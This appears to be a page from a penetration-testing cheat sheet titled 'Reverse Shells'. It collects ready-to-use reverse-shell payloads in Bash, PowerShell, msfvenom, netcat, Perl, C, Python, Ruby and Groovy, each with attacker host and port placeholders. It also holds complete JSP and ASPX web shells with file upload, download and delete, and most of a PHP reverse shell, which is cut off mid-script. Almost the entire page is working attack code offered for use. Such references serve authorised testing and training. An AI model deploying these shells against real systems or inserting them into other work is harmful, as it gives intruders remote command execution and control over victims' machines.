---
title: "Reverse Shells"
category: shells
order: 10
description: "Reverse shell one-liners across 10+ languages."
tags: [shell, reverse]
---

## Bash

### /dev/tcp redirect (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
bash -i >& /dev/tcp/§LHOST§/§LPORT§ 0>&1
```
{% endraw %}

### mkfifo + nc pipe (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc §LHOST§ §LPORT§ >/tmp/f
```
{% endraw %}

### fd 196 (Bash 4.0+, Linux)

_Platform: Linux/Unix, Bash 4.0+_

{% raw %}
```bash
0<&196;exec 196<>/dev/tcp/§LHOST§/§LPORT§;bash <&196 >&196 2>&196
```
{% endraw %}

### fd 5 read loop (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
exec 5<>/dev/tcp/§LHOST§/§LPORT§;cat <&5 | while read line; do $line 2>&5 >&5; done
```
{% endraw %}

### fd 5 interactive (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
bash -i 5<> /dev/tcp/§LHOST§/§LPORT§ 0<&5 1>&5 2>&5
```
{% endraw %}

### /dev/udp redirect (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
bash -i >& /dev/udp/§LHOST§/§LPORT§ 0>&1
```
{% endraw %}

## PowerShell

### Nishang Invoke-PowerShellTcp (Windows)

_Platform: Windows_

{% raw %}
```powershell
##### NISHANG reverse shells (generic shell listener)
# 1. clone https://github.com/samratashok/nishang (attacker machine)
git clone https://github.com/samratashok/nishang

# 2. Navigate to directory & serve shell files (attacker machine)
cd nishang/Shells
python3 -m http.server 80

# 3. Execute (target machine)
IEX(New-Object Net.WebClient).DownloadString('http://§LHOST§:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress §LHOST§ -Port §LPORT§
```
{% endraw %}

### TCPClient StreamReader loop (Windows, PowerShell 2.0+)

_Platform: Windows, PowerShell 2.0+_

{% raw %}
```powershell
$LHOST = "§LHOST§"; 
$LPORT = §LPORT§; 
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) { 
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
    };
    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
        $Output = try { Invoke-Expression ($Code) 2>&1 } 
        catch { $_ };
        $StreamWriter.Write("$Output`n"); 
        $Code = $null 
    } 
};
$TCPClient.Close(); 
$NetworkStream.Close();
$StreamReader.Close(); 
$StreamWriter.Close()
```
{% endraw %}

### TCPClient iex loop (Windows, PowerShell 2.0+)

_Platform: Windows, PowerShell 2.0+_

{% raw %}
```powershell
try {
    $client = New-Object System.Net.Sockets.TCPClient('§LHOST§',§LPORT§);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
        try {
            $sendback = (iex $data 2>&1 | Out-String);
        } catch {
            $sendback = "Error executing command: $_";
        }
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
        $stream.Write($sendbyte, 0, $sendbyte.Length);
        $stream.Flush();
    }
    
    $client.Close();
} catch {
    Write-Error "An error occurred: $_"
}
```
{% endraw %}

### Base64-encoded one-liner (Windows)

_Platform: Windows_

{% raw %}
```powershell
# 1. create the 1 liner reverse shell (use pwsh)
$client = New-Object System.Net.Sockets.TCPClient("§LHOST§",§LPORT§);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# 2. encode it with the base64 - UTF-16LE character set (within this plugin)
...

# 3. run the payload on the target machine
powershell -enc $EncodedText
```
{% endraw %}

## Msfvenom

### Meterpreter ELF (Linux x86/x64)

_Platform: Linux/Unix_

{% raw %}
```bash
# 1. Generate the payload for x64 architecture
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f elf > meterpreterx64.elf

# 2. Generate the payload for x86 architecture
msfvenom -p linux/meterpreter_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f elf > meterpreterx86.elf
```
{% endraw %}

### Meterpreter EXE (Windows x86/x64)

_Platform: Windows_

{% raw %}
```bash
# 1. Generate the payload for x64 architecture
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f exe > meterpreterx64.exe

# 2. Generate the payload for x86 architecture
msfvenom -p windows/meterpreter_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f exe > meterpreterx86.exe
```
{% endraw %}

### Shell ELF (Linux x86/x64)

_Platform: Linux/Unix_

{% raw %}
```bash
# 1. Generate the payload for x64 architecture
msfvenom -p linux/x64/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f elf > shellx64.elf
                
# 2. Generate the payload for x86 architecture
msfvenom -p linux/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f elf > shellx86.elf
```
{% endraw %}

### Shell EXE + DLL (Windows x86/x64)

_Platform: Windows_

{% raw %}
```bash
# 1. Generate the payload for x64 architecture
msfvenom -p windows/x64/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f exe > shellx64.exe
                
# 2. Generate the payload for x86 architecture
msfvenom -p windows/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f exe > shellx86.exe

# 3. Generate a .dll file for Windows (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f dll -o file.dll

# 4. Generate a .dll file for Windows (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=§LHOST§ LPORT=§LPORT§ -f dll -o file.dll
```
{% endraw %}

## Netcat

### nc -e /bin/bash (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
nc §LHOST§ §LPORT§ -e /bin/bash
```
{% endraw %}

### nc.exe -e (Windows)

_Platform: Windows_

{% raw %}
```bash
nc.exe §LHOST§ §LPORT§ -e /bin/bash
```
{% endraw %}

### nc -c /bin/bash (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
nc -c /bin/bash §LHOST§ §LPORT§
```
{% endraw %}

## Ncat

### ncat -e /bin/bash (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
ncat §LHOST§ §LPORT§ -e /bin/bash
```
{% endraw %}

### ncat.exe -e (Windows)

_Platform: Windows_

{% raw %}
```bash
ncat.exe §LHOST§ §LPORT§ -e /bin/bash
```
{% endraw %}

## Perl

### Perl Socket + exec (Linux)

_Platform: Linux/Unix_

{% raw %}
```perl
perl -e 'use Socket;
$i="§LHOST§";$p=§LPORT§;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("bash -i");
};'
```
{% endraw %}

### Perl IO::Socket fork (Linux)

_Platform: Linux/Unix_

{% raw %}
```perl
perl -MIO -e '$p=fork;exit,if($p);
$c=new IO::Socket::INET(PeerAddr,"§LHOST§:§LPORT§");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>'
```
{% endraw %}

## C

### C reverse shell (Windows, x86_64)

_Platform: Windows_

{% raw %}
```c
// 1. compile as follows: 
// x86_64-w64-mingw32-gcc-win32 main.c -shared -lws2_32 -o RevShell.dll

// 2. once compiled, check the exports (functions) of the DLL that can be called by rundll32.exe:
// python3 -m pefile exports RevShell.dll

// 3. execute the DLL using rundll32.exe (optional):
// rundll32.exe RevShell.dll,ExecuteShell

#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int ReverShell(const char* CLIENT_IP, int CLIENT_PORT) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}

void ExecuteShell(){
    ReverShell("§LHOST§", §LPORT§);
}
```
{% endraw %}

## Python3

### Threaded subprocess (cross-platform, python3)

_Platform: Windows/Linux/Unix, Python 3.0+_

{% raw %}
```python
import os,socket,subprocess,threading;
def s2p(s, p): 
    while True: 
        data = s.recv(1024) 
        if len(data) > 0: 
            p.stdin.write(data) 
            p.stdin.flush()
def p2s(s, p): 
    while True: 
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("§LHOST§",§LPORT§))
p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True 
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True 
p2s_thread.start()
try: 
    p.wait() 
except KeyboardInterrupt: 
    s.close()
```
{% endraw %}

### pty.spawn .py file (Linux, python3)

_Platform: Linux/Unix, Python 3.0+_

{% raw %}
```python
import os,pty,socket;
s=socket.socket();
s.connect(("§LHOST§",§LPORT§));
[os.dup2(s.fileno(),f)for f in(0,1,2)];
pty.spawn("bash")
```
{% endraw %}

### pty.spawn via env vars (Linux, python3)

_Platform: Linux/Unix, Python 3.0+_

{% raw %}
```python
export RHOST="§LHOST§";
export RPORT=§LPORT§;
python3 -c 'import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("bash")'
```
{% endraw %}

### pty.spawn via dup2 (Linux, python3)

_Platform: Linux/Unix, Python 3.0+_

{% raw %}
```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("§LHOST§",§LPORT§));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; 
pty.spawn("bash")'
```
{% endraw %}

### pty.spawn one-liner (Linux, python3)

_Platform: Linux/Unix, Python 3.0+_

{% raw %}
```python
python3 -c 'import os,pty,socket;
s=socket.socket();
s.connect(("§LHOST§",§LPORT§));
[os.dup2(s.fileno(),f)for f in(0,1,2)];
pty.spawn("bash")'
```
{% endraw %}

## Ruby

### TCPSocket interactive loop (cross-platform, ruby)

_Platform: Linux/Unix && Windows_

{% raw %}
```bash
#!/usr/bin/env ruby
require 'socket'

H = ARGV[0] || '§LHOST§'
P = (ARGV[1] || §LPORT§).to_i
W = RUBY_PLATFORM =~ /win|mingw/i
U = (W ? ENV['USERNAME'] : ENV['USER']) || `whoami`.strip rescue '?'
N = `hostname`.strip rescue '?'

loop do
  begin
    s = TCPSocket.new(H, P)
    s.sync = true
    s.puts "#{W ? `ver` : `uname -a`}"

    loop do
      s.print "#{U}@#{N}:#{Dir.pwd}$ "
      c = s.gets&.strip
      break if c.nil? || c == 'exit'
      next if c.empty?

      if c =~ /^cd\s*(.*)/
        Dir.chdir($1.empty? ? (ENV['HOME'] || '/') : $1) rescue s.puts("Invalid directory")
      else
        s.puts `#{c} 2>&1`
      end
    end
  rescue
    sleep 3
  end
end
```
{% endraw %}

## Groovy

### Groovy reverse shell (Windows)

_Platform: Windows / groovy_

{% raw %}
```bash
String host="§LHOST§";
int port=§LPORT§;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endraw %}

### Groovy reverse shell (Linux)

_Platform: Linux / groovy_

{% raw %}
```bash
String host="§LHOST§";
int port=§LPORT§;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endraw %}

## Jsp

### jsp web shell

_Platform: JSP web shell_

{% raw %}
```xml
<%@page import="java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String[] command;
    if(os.contains("win"))
        command = new String[]{"cmd.exe", "/c", cmd};
    else
        command = new String[]{"/bin/sh", "-c", cmd};
    Process proc = Runtime.getRuntime().exec(command);
    BufferedReader stdOut = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    BufferedReader stdErr = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = stdOut.readLine()) != null)
        sb.append(line).append("\n");
    while((line = stdErr.readLine()) != null)
        sb.append(line).append("\n");
    int exitCode = proc.waitFor();
    String output = sb.toString()
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;");
    if(exitCode != 0)
        out.println("<pre style='color:red'>" + output + "</pre>");
    else
        out.println("<pre>" + output + "</pre>");
}
%>
<form method="get">
    <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>
```
{% endraw %}

## Aspx

### ASPX web shell (Windows, authenticated)

_Platform: Windows/ ASPX_

{% raw %}
```xml
<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
 
<%
 
	string secretKey = "YourMomHeetsHenk!@4"; // Your secret key here
	string auth = Request.QueryString["auth"];
 
	if (auth != secretKey)
	{
	    Response.StatusCode = 403;
	    Response.Write("<h2>403 Forbidden</h2>");
	    Response.End();
	}
 
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?fdir={0}&auth={1}'>{2}/</a>&nbsp;",
									HttpUtility.UrlEncode(linkwalk),
                                    secretKey,
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("<a href='?fdir={0}&auth={1}'>{2}</a>&nbsp;",
									HttpUtility.UrlEncode(driveRoot),
                                    secretKey,
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;
 
	// send file ?
	if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString["get"]);
		Response.End();
	}
 
	// delete file ?
	if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
		File.Delete(Request.QueryString["del"]);	
 
	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}
 
	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("<a href='?fdir={0}&auth={1}'>{2}</a>",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
                                    secretKey,
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format("<a href='?get={0}&auth={1}' target='_blank'>{2}</a>",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
                                    secretKey,
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format("<a href='?fdir={0}&auth={1}&del={2}'>Del</a>",
									HttpUtility.UrlEncode(dir),
                                    secretKey,
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;
 
	// exec cmd ?
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();
 
		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
				</p>
				<p>
					Working directory:<br />
					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
				</table>
				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>
			</td>
		</tr>
    </table>
 
    </form>
</body>
</html>
```
{% endraw %}

### ASPX web shell (Windows)

_Platform: Windows/ ASPX_

{% raw %}
```xml
<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;

	// send file ?
	if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString["get"]);
		Response.End();
	}

	// delete file ?
	if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
		File.Delete(Request.QueryString["del"]);	

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}

	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;

	// exec cmd ?
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
				</p>
				<p>
					Working directory:<br />
					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
				</table>
				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>
			</td>
		</tr>
    </table>

    </form>
</body>
</html>
```
{% endraw %}

## PHP

### pentestmonkey proc_open (Linux)

_Platform: Linux/Unix_

{% raw %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '§LHOST§';  // CHANGE THIS
$port = §LPORT§;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
